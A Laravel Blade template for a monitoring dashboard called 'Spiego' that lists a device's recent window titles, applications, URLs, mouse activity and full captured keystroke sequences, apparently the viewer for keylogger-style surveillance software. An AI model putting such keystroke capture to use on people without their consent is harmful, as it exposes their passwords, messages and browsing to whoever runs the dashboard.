<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spiego - {{ $device->hostname }} - {{ $eventTypeLabel }}</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 30px 0;
        }
        .container {
            max-width: 1200px;
        }
        .header-card {
            background: white;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 30px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .event-item {
            background: white;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 15px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            border-left: 4px solid #667eea;
        }
        .event-time {
            color: #6c757d;
            font-size: 0.9rem;
        }
        .event-data {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin-top: 10px;
            font-family: monospace;
            font-size: 0.9rem;
        }
        .back-btn {
            background: white;
            border: none;
            padding: 10px 20px;
            border-radius: 10px;
            color: #667eea;
            font-weight: 600;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            transition: transform 0.2s;
        }
        .back-btn:hover {
            transform: translateX(-5px);
            color: #764ba2;
        }
        .pagination {
            background: white;
            padding: 15px;
            border-radius: 10px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Back Button -->
        <div class="mb-3">
            <a href="{{ route('devices.show', $device->hostname) }}" class="back-btn">
                <i class="bi bi-arrow-left"></i> Back to {{ $device->hostname }}
            </a>
        </div>

        <!-- Header -->
        <div class="header-card">
            <h3 class="mb-2">
                <i class="bi bi-laptop text-primary"></i> {{ $device->hostname }}
            </h3>
            <h5 class="text-muted">
                <i class="bi bi-{{ $eventIcon }}"></i> {{ $eventTypeLabel }}
            </h5>
            <p class="text-muted mb-0">
                Showing {{ $events->total() }} events from the last 24 hours
            </p>
        </div>

        <!-- Events List -->
        @if($eventType === 'foreground_change')
            <div class="mb-3">
                <form method="GET" class="row g-2 align-items-center" action="{{ route('devices.events', ['hostname' => $device->hostname]) }}">
                    <input type="hidden" name="type" value="foreground_change" />
                    @if(isset($appFilter) && $appFilter)
                        <input type="hidden" name="app" value="{{ $appFilter }}" />
                    @endif
                    <div class="col-md-4">
                        <input type="text" name="window" value="{{ request('window', '') }}" class="form-control" placeholder="Search Window Name (title)" />
                    </div>
                    <div class="col-md-4">
                        <input type="text" name="url" value="{{ $urlFilter ?? '' }}" class="form-control" placeholder="Search URL (example.com/path)" />
                    </div>
                    <div class="col-md-2">
                        <button class="btn btn-outline-primary w-100">Search</button>
                    </div>
                    <div class="col-md-2">
                        @if(!empty($urlFilter) || !empty($appFilter) || !empty(request('window', '')))
                            <a href="{{ route('devices.events', ['hostname' => $device->hostname, 'type' => 'foreground_change', 'app' => $appFilter ?? null]) }}" class="btn btn-link w-100">Clear</a>
                        @endif
                    </div>
                </form>
            </div>
        @endif
        @foreach($events as $event)
            <div class="event-item">
                <div class="d-flex justify-content-between align-items-start mb-2">
                    <div>
                        <strong><i class="bi bi-{{ $eventIcon }}"></i> {{ $eventTypeLabel }}</strong>
                    </div>
                    <span class="event-time">
                        <i class="bi bi-clock"></i> {{ $event->timestamp->format('M d, Y H:i:s') }}
                        <small>({{ $event->timestamp->diffForHumans() }})</small>
                    </span>
                </div>
                
                @if($eventType === 'foreground_change')
                    <div class="mt-2">
                        <div class="row">
                            <div class="col-md-6">
                                <strong>Window:</strong> {{ $event->data['title'] ?? 'Unknown' }}
                            </div>
                            <div class="col-md-3">
                                <strong>Application:</strong> {{ $event->data['process_name'] ?? 'N/A' }}
                            </div>
                            <div class="col-md-3">
                                @if(isset($event->data['url']))
                                    <strong>URL:</strong> <code>{{ $event->data['url'] }}</code>
                                @else
                                    <span class="text-muted">No URL</span>
                                @endif
                            </div>
                        </div>
                    </div>
                    
                @elseif($eventType === 'key_count')
                    <div class="mt-2">
                        <strong>Keys Pressed:</strong> {{ $event->data['count'] ?? 0 }}
                        @if(isset($event->data['keystrokes']) && !empty($event->data['keystrokes']))
                            <div class="event-data mt-2">
                                <strong>Keystroke Sequence:</strong><br>
                                {{ collect($event->data['keystrokes'])->pluck('key')->implode(' ') }}
                            </div>
                        @endif
                    </div>
                    
                @elseif($eventType === 'mouse_idle')
                    <div class="mt-2">
                        <strong>Idle Duration:</strong> {{ round($event->data['idle_seconds'] ?? 0) }} seconds
                    </div>
                    
                @elseif($eventType === 'mouse_active')
                    <div class="mt-2">
                        <strong>Position:</strong> ({{ $event->data['x'] ?? 0 }}, {{ $event->data['y'] ?? 0 }})
                    </div>
                    
                @else
                    <div class="event-data">
                        <pre class="mb-0">{{ json_encode($event->data, JSON_PRETTY_PRINT) }}</pre>
                    </div>
                @endif
            </div>
        @endforeach

        <!-- Compact Pagination -->
        <div class="pagination d-flex justify-content-center align-items-center">
            @php
                $paginator = $events;
                $current = $paginator->currentPage();
                $last = $paginator->lastPage();
                $start = max(1, $current - 2);
                $end = min($last, $current + 2);
            @endphp

            <nav aria-label="Page navigation">
                <ul class="pagination mb-0">
                    {{-- Previous --}}
                    <li class="page-item {{ $current == 1 ? 'disabled' : '' }}">
                        <a class="page-link px-2" href="{{ $paginator->appends(request()->except('page'))->url(max(1, $current - 1)) }}" aria-label="Previous">
                            &laquo;
                        </a>
                    </li>

                    {{-- First page shortcut --}}
                    @if($start > 1)
                        <li class="page-item">
                            <a class="page-link px-2" href="{{ $paginator->appends(request()->except('page'))->url(1) }}">1</a>
                        </li>
                        @if($start > 2)
                            <li class="page-item disabled"><span class="page-link px-2">…</span></li>
                        @endif
                    @endif

                    {{-- Range --}}
                    @for($i = $start; $i <= $end; $i++)
                        <li class="page-item {{ $i == $current ? 'active' : '' }}">
                            <a class="page-link px-2" href="{{ $paginator->appends(request()->except('page'))->url($i) }}">{{ $i }}</a>
                        </li>
                    @endfor

                    {{-- Last page shortcut --}}
                    @if($end < $last)
                        @if($end < $last - 1)
                            <li class="page-item disabled"><span class="page-link px-2">…</span></li>
                        @endif
                        <li class="page-item">
                            <a class="page-link px-2" href="{{ $paginator->appends(request()->except('page'))->url($last) }}">{{ $last }}</a>
                        </li>
                    @endif

                    {{-- Next --}}
                    <li class="page-item {{ $current == $last ? 'disabled' : '' }}">
                        <a class="page-link px-2" href="{{ $paginator->appends(request()->except('page'))->url(min($last, $current + 1)) }}" aria-label="Next">
                            &raquo;
                        </a>
                    </li>
                </ul>
            </nav>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
